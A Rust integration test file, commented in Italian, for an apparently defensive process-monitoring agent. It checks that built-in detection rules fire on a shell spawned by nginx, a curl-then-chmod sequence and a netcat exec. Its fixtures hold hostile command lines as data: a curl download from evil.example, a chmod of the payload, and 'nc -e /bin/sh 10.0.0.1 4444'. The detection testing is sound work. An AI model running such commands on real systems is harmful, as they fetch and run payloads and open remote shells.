//! Integration test del rules engine: carica le regole built-in reali dal
//! filesystem (`crates/kerneltrace-agent/src/detection/builtin_rules`) e
//! verifica che il pattern "curl seguito da chmod" e la regola "shell da
//! web server" scattino correttamente su eventi realistici.

use std::path::PathBuf;

use chrono::Utc;
use kerneltrace_agent::detection::{load_rules_from_directory, DetectionEngine};
use kerneltrace_agent::events::{Enricher, EventKind, EventPayload, NormalizedEvent, ProcessContext};
use uuid::Uuid;

fn builtin_rules_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("src")
        .join("detection")
        .join("builtin_rules")
}

fn exec_event(pid: u32, ppid: u32, comm: &str, parent_comm: Option<&str>, filename: &str, args: Vec<&str>) -> NormalizedEvent {
    NormalizedEvent {
        id: Uuid::new_v4(),
        timestamp: Utc::now(),
        event_kind: EventKind::Exec,
        process: ProcessContext {
            pid,
            tgid: pid,
            ppid,
            uid: 1000,
            gid: 1000,
            comm: comm.to_string(),
            cgroup_id: 0,
            parent_comm: parent_comm.map(String::from),
        },
        payload: EventPayload::Exec {
            filename: filename.to_string(),
            args: args.into_iter().map(String::from).collect(),
        },
        container: None,
        tags: Vec::new(),
    }
}

#[test]
fn builtin_rules_directory_loads_without_errors() {
    let rules = load_rules_from_directory(&builtin_rules_dir(), true)
        .expect("all builtin rules must parse successfully");

    // Le sei regole richieste nel prompt iniziale del progetto devono
    // essere tutte presenti e caricate correttamente.
    assert!(rules.len() >= 6, "expected at least 6 builtin rules, found {}", rules.len());
}

#[test]
fn shell_from_webserver_rule_triggers_on_realistic_event() {
    let rules = load_rules_from_directory(&builtin_rules_dir(), true).unwrap();
    let engine = DetectionEngine::new(rules);

    let mut event = exec_event(500, 400, "bash", Some("nginx"), "/bin/bash", vec![]);
    engine.enrich(&mut event);

    assert!(
        event.tags.iter().any(|t| t == "rule:builtin-shell-from-webserver"),
        "tags were: {:?}",
        event.tags
    );
}

#[test]
fn shell_from_unrelated_parent_does_not_trigger() {
    let rules = load_rules_from_directory(&builtin_rules_dir(), true).unwrap();
    let engine = DetectionEngine::new(rules);

    let mut event = exec_event(500, 400, "bash", Some("systemd"), "/bin/bash", vec![]);
    engine.enrich(&mut event);

    assert!(!event.tags.iter().any(|t| t == "rule:builtin-shell-from-webserver"));
}

#[test]
fn curl_then_chmod_sequence_rule_triggers_end_to_end() {
    let rules = load_rules_from_directory(&builtin_rules_dir(), true).unwrap();
    let engine = DetectionEngine::new(rules);

    // Stesso ppid (700): entrambi i comandi sono figli dello stesso
    // script di shell, il pattern di correlazione atteso dalla regola.
    let mut curl_event = exec_event(800, 700, "curl", None, "/usr/bin/curl", vec!["-O", "http://evil.example/payload"]);
    engine.enrich(&mut curl_event);
    assert!(curl_event.tags.is_empty(), "curl alone should not trigger the sequence rule");

    let mut chmod_event = exec_event(801, 700, "chmod", None, "/usr/bin/chmod", vec!["+x", "payload"]);
    engine.enrich(&mut chmod_event);
    assert!(
        chmod_event.tags.iter().any(|t| t == "rule:builtin-curl-then-chmod"),
        "tags were: {:?}",
        chmod_event.tags
    );
}

#[test]
fn netcat_exec_rule_triggers_on_bind_shell_pattern() {
    let rules = load_rules_from_directory(&builtin_rules_dir(), true).unwrap();
    let engine = DetectionEngine::new(rules);

    let mut event = exec_event(900, 1, "nc", None, "/usr/bin/nc", vec!["-e", "/bin/sh", "10.0.0.1", "4444"]);
    engine.enrich(&mut event);

    assert!(event.tags.iter().any(|t| t == "rule:builtin-netcat-socat-exec"));
}